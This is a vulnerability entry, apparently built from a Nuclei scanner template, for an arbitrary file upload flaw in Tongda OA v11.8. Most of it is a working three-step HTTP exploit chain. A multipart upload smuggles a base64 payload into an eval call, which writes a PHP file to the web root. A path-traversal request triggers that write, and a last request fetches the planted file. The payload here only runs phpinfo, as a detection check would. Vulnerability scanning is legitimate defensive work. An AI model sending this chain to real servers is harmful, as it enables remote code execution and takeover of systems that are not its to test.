# Vulnerability: Tongda OA v11.8 api.ali.php - Arbitrary File Upload
**Classification:** TONGDA
**Source:** Nuclei Template (`tongda-api-file-upload.yaml`)

## Description
Tongda OA v11.8 api.ali.php has an arbitrary file upload vulnerability. An attacker can upload malicious files to control the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /mobile/api/api.ali.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=502f67681799b07e5de6b503655f5cae
Accept-Encoding: gzip

--502f67681799b07e5de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
Content-Type: application/octet-stream

{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{"a":"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*"}"}
--502f67681799b07e5de6b503655f5cae--

GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M", unix_time()),"20")}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

GET /{{randstr}}.php  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

